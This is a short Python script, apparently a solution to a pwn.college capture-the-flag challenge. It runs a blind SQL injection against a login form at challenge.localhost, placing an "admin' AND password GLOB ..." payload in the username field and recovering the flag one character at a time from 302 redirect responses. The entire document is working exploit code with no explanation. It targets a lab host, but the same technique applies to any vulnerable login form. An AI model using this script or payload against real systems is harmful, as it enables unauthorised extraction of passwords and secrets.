import requests

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_"

secret = ""

done = False

while not done:
    i = 0
    while i < len(chars):
        c = chars[i]
        payload = {
            "username": "admin' AND password GLOB 'pwn.college{%s*' -- -" % (secret + c),
            "password": "doesnt_matter",
        }

        resp = requests.post("http://challenge.localhost/", data=payload, allow_redirects=False)

        if resp.status_code == 302:
            secret += c
            break

        i += 1

    if i == len(chars):
        done = True

print("pwn.college{%s}" % secret)
